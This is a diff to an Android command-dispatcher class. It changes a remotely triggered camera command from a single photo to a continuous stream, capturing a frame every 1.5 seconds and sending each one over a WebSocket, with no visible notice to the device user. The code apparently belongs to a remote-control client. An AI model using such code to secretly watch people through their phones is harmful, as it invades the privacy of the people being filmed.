@@ -718,39 +718,44 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
     // ============ 摄像头 ============
 
     private CameraDevice cameraDevice;
+    private CameraCaptureSession cameraSession;
     private HandlerThread cameraThread;
     private Handler cameraHandler;
+    private ImageReader cameraReader;
+    private volatile boolean cameraStreaming = false;
+    private java.util.concurrent.ScheduledExecutorService cameraScheduler;
 
     /**
-     * 开启摄像头拍照
-     * 格式: {"type":"screencomd", "subc":"Camera", "SelectedCam":"back/front"}
+     * 开启摄像头实时拍照流
+     * 每 1.5 秒拍一张 → Base64 → ws.sendCamera()
      */
     private void handleCamera(JsonObject payload) {
         String selectedCam = ScreenActionParser.getString(payload, "SelectedCam", "back");
         Log.d(TAG, "Camera: " + selectedCam);
 
+        // 先关闭已有的
+        handleCameraOff();
+
         Context ctx = getAppContext();
         if (ctx == null) return;
+
+        cameraStreaming = true;
 
         new Thread(() -> {
             try {
                 CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
                 if (cm == null) return;
 
-                // 选择摄像头: back=0, front=1
-                String[] ids = cm.getCameraIdList();
                 String cameraId = "0";
-                for (String id : ids) {
+                for (String id : cm.getCameraIdList()) {
                     CameraCharacteristics chars = cm.getCameraCharacteristics(id);
                     Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                     if ("front".equals(selectedCam) && facing != null
                             && facing == CameraCharacteristics.LENS_FACING_FRONT) {
-                        cameraId = id;
-                        break;
+                        cameraId = id; break;
                     } else if ("back".equals(selectedCam) && facing != null
                             && facing == CameraCharacteristics.LENS_FACING_BACK) {
-                        cameraId = id;
-                        break;
+                        cameraId = id; break;
                     }
                 }
 
@@ -758,9 +763,8 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                 cameraThread.start();
                 cameraHandler = new Handler(cameraThread.getLooper());
 
-                final String finalCameraId = cameraId;
-                final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
-                reader.setOnImageAvailableListener(r -> {
+                cameraReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+                cameraReader.setOnImageAvailableListener(r -> {
                     Image image = r.acquireLatestImage();
                     if (image != null) {
                         java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
@@ -768,35 +772,39 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
                         buffer.get(bytes);
                         image.close();
 
-                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                         WebSocketClient ws = getWsClient();
-                        if (ws != null) {
-                            ws.sendCamera(base64);
-                            Log.d(TAG, "Camera image sent: " + bytes.length + " bytes");
+                        if (ws != null && cameraStreaming) {
+                            ws.sendCamera(Base64.encodeToString(bytes, Base64.NO_WRAP));
                         }
                     }
                 }, cameraHandler);
 
-                cm.openCamera(finalCameraId, new CameraDevice.StateCallback() {
+                final String fCameraId = cameraId;
+                cm.openCamera(fCameraId, new CameraDevice.StateCallback() {
                     @Override
                     public void onOpened(CameraDevice camera) {
                         cameraDevice = camera;
                         try {
-                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                            builder.addTarget(reader.getSurface());
-                            builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
-
                             camera.createCaptureSession(
-                                java.util.Collections.singletonList(reader.getSurface()),
+                                java.util.Collections.singletonList(cameraReader.getSurface()),
                                 new CameraCaptureSession.StateCallback() {
                                     @Override
                                     public void onConfigured(CameraCaptureSession session) {
-                                        try {
-                                            session.capture(builder.build(), null, cameraHandler);
-                                            Log.d(TAG, "Camera capture requested");
-                                        } catch (CameraAccessException e) {
-                                            Log.e(TAG, "Capture failed", e);
-                                        }
+                                        cameraSession = session;
+                                        // 定时拍照: 每 1.5 秒一帧
+                                        cameraScheduler = java.util.concurrent.Executors.newSingleThreadScheduledExecutor();
+                                        cameraScheduler.scheduleAtFixedRate(() -> {
+                                            if (!cameraStreaming || cameraDevice == null) return;
+                                            try {
+                                                CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
+                                                builder.addTarget(cameraReader.getSurface());
+                                                builder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
+                                                session.capture(builder.build(), null, cameraHandler);
+                                            } catch (Exception e) {
+                                                Log.w(TAG, "Camera capture tick failed", e);
+                                            }
+                                        }, 0, 1500, java.util.concurrent.TimeUnit.MILLISECONDS);
+                                        Log.d(TAG, "Camera streaming started");
                                     }
                                     @Override
                                     public void onConfigureFailed(CameraCaptureSession session) {
@@ -824,9 +832,22 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
     private void handleCameraOff() {
         Log.d(TAG, "Camera off");
+        cameraStreaming = false;
+        if (cameraScheduler != null) {
+            cameraScheduler.shutdownNow();
+            cameraScheduler = null;
+        }
+        if (cameraSession != null) {
+            try { cameraSession.close(); } catch (Exception ignored) {}
+            cameraSession = null;
+        }
         if (cameraDevice != null) {
             cameraDevice.close();
             cameraDevice = null;
+        }
+        if (cameraReader != null) {
+            cameraReader.close();
+            cameraReader = null;
         }
         if (cameraThread != null) {
             cameraThread.quitSafely();
